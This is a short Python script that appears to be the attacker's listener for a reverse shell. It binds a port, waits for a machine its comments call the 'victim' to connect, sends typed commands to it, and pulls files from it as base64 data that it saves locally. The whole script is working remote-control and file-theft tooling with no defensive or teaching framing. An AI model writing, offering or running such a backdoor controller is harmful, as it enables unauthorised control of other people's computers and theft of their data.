import socket, base64

# creating a socket and wait for the client call
s = socket.socket()
s.bind(('0.0.0.0', 9999))
s.listen(1)
conn, addr = s.accept()
print(f"Connected to: {addr}")

while True:
    # Get command from user and send to victim
    cmd = input("Enter Command: ")
    conn.send(cmd.encode())
    if cmd == "exit": break

    # download and saving the incoming data
    if cmd.startswith("download "):
        file_data = conn.recv(1024**2)
        with open("received_" + cmd.split()[1], "wb") as f:
            f.write(base64.b64decode(file_data))
        print("File saved.")
    else:
        # show the output of normal commands
        print(conn.recv(4096).decode())